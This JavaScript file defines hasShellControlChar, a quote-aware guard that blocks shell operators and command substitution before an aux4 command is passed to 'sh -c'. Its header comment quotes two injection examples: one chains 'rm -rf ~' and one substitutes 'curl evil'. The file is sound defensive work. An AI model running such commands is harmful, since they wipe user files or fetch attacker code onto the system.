// executeAux4 runs the model's command through `sh -c`, so shell control operators would
// let a caller chain any binary (`aux4 version; rm -rf ~`) or substitute one
// (`aux4 $(curl evil)`). The guard used to be a single regex run against the WHOLE command
// string, which meant quoted content was checked exactly like unquoted content — so a
// perfectly legitimate argument like `--path "File > Save As…"` (quoted, never seen by the
// shell as a redirect) was rejected as if it were an unquoted `>`.
//
// This scanner walks the string tracking POSIX quote state, so operators are only flagged
// where a real `sh -c` invocation would actually interpret them:
//
// - Outside quotes: `; & | \`` newline/CR `$(` `${` `<(` `>` `<` are rejected. A backslash
//   escapes the very next character (it becomes literal and is skipped), EXCEPT a
//   backslash immediately followed by a newline is itself rejected.
// - Inside single quotes: everything is literal (POSIX defines no escape inside single
//   quotes) except a raw newline/CR is still rejected.
// - Inside double quotes: `> < | ; &` are literal (the shell does not treat them as
//   operators there), but `` ` ``, `$(`, `${` and newline/CR are still rejected because the
//   shell still expands them inside double quotes. A backslash only escapes
//   `$ \` " \ <newline>` inside double quotes (POSIX); any other backslash is literal and
//   left alone.
// - An unterminated quote (open at end of string) is rejected.
//
// Returns `true` when the command contains a shell control sequence that is not neutralized
// by quoting (i.e. it should be rejected), `false` when it is safe to pass to `sh -c` as a
// single aux4 command.
export function hasShellControlChar(command) {
  const str = command || "";
  let quote = null; // null | "'" | '"'

  for (let i = 0; i < str.length; ) {
    const ch = str[i];

    if (quote === "'") {
      if (ch === "\n" || ch === "\r") {
        return true;
      }
      if (ch === "'") {
        quote = null;
      }
      i += 1;
      continue;
    }

    if (quote === '"') {
      if (ch === "\\") {
        const next = str[i + 1];
        if (next === "$" || next === "`" || next === '"' || next === "\\" || next === "\n") {
          i += 2;
          continue;
        }
        i += 1;
        continue;
      }
      if (ch === "\n" || ch === "\r" || ch === "`") {
        return true;
      }
      if (ch === "$" && (str[i + 1] === "(" || str[i + 1] === "{")) {
        return true;
      }
      if (ch === '"') {
        quote = null;
      }
      i += 1;
      continue;
    }

    // Outside any quote.
    if (ch === "\\") {
      if (str[i + 1] === "\n") {
        return true;
      }
      i += 2;
      continue;
    }

    if (ch === "'" || ch === '"') {
      quote = ch;
      i += 1;
      continue;
    }

    if (
      ch === ";" || ch === "&" || ch === "|" || ch === "`" ||
      ch === "\n" || ch === "\r" || ch === ">" || ch === "<"
    ) {
      return true;
    }

    if (ch === "$" && (str[i + 1] === "(" || str[i + 1] === "{")) {
      return true;
    }

    i += 1;
  }

  // An open quote at the end of the string means `sh -c` would see an unterminated
  // string — reject rather than guess what was meant.
  if (quote !== null) {
    return true;
  }

  return false;
}

export default hasShellControlChar;
